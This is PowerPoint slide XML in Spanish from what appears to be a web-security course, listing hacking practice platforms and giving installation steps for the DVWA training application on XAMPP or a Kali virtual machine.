              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Laboratorios</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7171" name="Marcador de texto 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1125127" y="958555"/>
            <a:ext cx="9998501" cy="551765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lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Laboratiorios web</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:hlinkClick r:id="" action="ppaction://noaction"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" dirty="0">
                <a:hlinkClick r:id="" action="ppaction://noaction"/>
              </a:rPr>
              <a:t>Hackthebox</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>Try</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>to</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>hack</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> me</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" dirty="0">
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>Pen</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>tester</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>lab</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" dirty="0">
                <a:hlinkClick r:id="rId5"/>
              </a:rPr>
              <a:t>Vulnhub</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>PortSwigger</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0">
                <a:hlinkClick r:id="rId6"/>
              </a:rPr>
              <a:t>labs</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>Veracode</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0">
                <a:hlinkClick r:id="rId7"/>
              </a:rPr>
              <a:t>labs</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Laboratorios descargables</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>DVWA</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>BWAPP</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>OWASPWA: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0">
                <a:hlinkClick r:id="rId8"/>
              </a:rPr>
              <a:t>video</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> ; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0">
                <a:hlinkClick r:id="rId9"/>
              </a:rPr>
              <a:t>máquina</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> virtual</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3524714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87801" y="373385"/>
            <a:ext cx="8264525" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Creando DVWA </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>lab</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7171" name="Marcador de texto 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2152650" y="1844675"/>
            <a:ext cx="9343950" cy="4248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a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Bajar aplicación</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Instalar XAMPP (Ojo, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>arrancar como administrador</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Colocar DVWA en ..\</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>xampp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>\</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>htdocs</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>http://127.0.0.1/dvwa/setup.php</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Modificar “</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>config.inc.php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>” para conexión con BBDD</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Crear base de datos</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" dirty="0">
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>http://127.0.0.1/login.php</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="1" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>admin / </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>password</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3634448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11514" y="282116"/>
            <a:ext cx="8264525" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DVWA – En máquina virtual</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="Marcador de texto 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C2B9077D-B9E7-1F6C-56B7-2EA1EBC05339}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="605009" y="1064752"/>
            <a:ext cx="10735436" cy="55111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342900" lvl="0" indent="-342900" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="7095CA"/>
              </a:buClr>
              <a:buFont typeface="Symbol" panose="05050102010706020507" pitchFamily="18" charset="2"/>
              <a:buChar char=""/>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Descargar máquina virtual: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0563C1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>enlace</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Importarla generando de nuevo las MAC</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" lvl="0" indent="-342900" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="7095CA"/>
              </a:buClr>
              <a:buFont typeface="Symbol" panose="05050102010706020507" pitchFamily="18" charset="2"/>
              <a:buChar char=""/>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Arrancar máquina virtual</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" lvl="0" indent="-342900" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="7095CA"/>
              </a:buClr>
              <a:buFont typeface="Symbol" panose="05050102010706020507" pitchFamily="18" charset="2"/>
              <a:buChar char=""/>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Descargamos ultima versión del DVWA en el </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>siguiente</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enlace</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" lvl="0" indent="-342900" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="7095CA"/>
              </a:buClr>
              <a:buFont typeface="Symbol" panose="05050102010706020507" pitchFamily="18" charset="2"/>
              <a:buChar char=""/>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Renombramos antigua carpeta</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1028700" lvl="1" indent="-342900" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="7095CA"/>
              </a:buClr>
              <a:buFont typeface="Symbol" panose="05050102010706020507" pitchFamily="18" charset="2"/>
              <a:buChar char=""/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="1400" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>sudo </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mv</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var</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/www/</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html</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dvwa</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var</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/www/</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html</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dvwaold</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" sz="14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Copiamos carpeta descargada a directorio de apache</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1028700" lvl="1" indent="-342900" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="7095CA"/>
              </a:buClr>
              <a:buFont typeface="Symbol" panose="05050102010706020507" pitchFamily="18" charset="2"/>
              <a:buChar char=""/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="1400" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>sudo </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cp</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 -R /home/</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kali</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Downloads</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/digininja-DVWA-97c8d23/ /</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var</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/www/</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html</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dvwa</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" sz="14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Renombramos fichero de configuración</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1028700" lvl="1" indent="-342900" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="7095CA"/>
              </a:buClr>
              <a:buFont typeface="Symbol" panose="05050102010706020507" pitchFamily="18" charset="2"/>
              <a:buChar char=""/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="1400" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>sudo </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mv</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var</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/www/</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html</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dvwa</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config</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config.inc.php.dist</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var</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/www/</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html</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dvwa</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config</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config.inc.php</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" sz="14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Modificamos el fichero de configuración</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1028700" lvl="1" indent="-342900" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="7095CA"/>
              </a:buClr>
              <a:buFont typeface="Symbol" panose="05050102010706020507" pitchFamily="18" charset="2"/>
              <a:buChar char=""/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="1400" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>sudo vi /</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var</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/www/</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html</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dvwa</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config</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1400" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1400" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>config.inc.php</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" sz="1400" dirty="0">
              <a:effectLst/>
              <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="1028700" lvl="1" indent="-342900" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="7095CA"/>
              </a:buClr>
              <a:buFont typeface="Symbol" panose="05050102010706020507" pitchFamily="18" charset="2"/>
              <a:buChar char=""/>
            </a:pPr>
            <a:endParaRPr lang="es-ES" sz="14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13" name="Imagen 12">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4486AA61-E3C2-ECBE-B9AE-5AB13DFD0389}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="7367950" y="2528783"/>
            <a:ext cx="4553585" cy="1495634"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2060039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11514" y="282116"/>
            <a:ext cx="8264525" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DVWA – En máquina virtual</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="Marcador de texto 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C2B9077D-B9E7-1F6C-56B7-2EA1EBC05339}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="605009" y="1064753"/>
            <a:ext cx="10735436" cy="513823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342900" lvl="0" indent="-342900" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="7095CA"/>
              </a:buClr>
              <a:buFont typeface="Symbol" panose="05050102010706020507" pitchFamily="18" charset="2"/>
              <a:buChar char=""/>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Arrancar servicio de apache: sudo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service</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apache2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restart</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Arrancar servicio de la base de datos: sudo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service</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mysql</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restart</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sudo </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0" err="1">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>chmod</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> 777 /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0" err="1">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>var</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>/www/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0" err="1">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>html</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0" err="1">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>dvwa</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0" err="1">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>hackable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
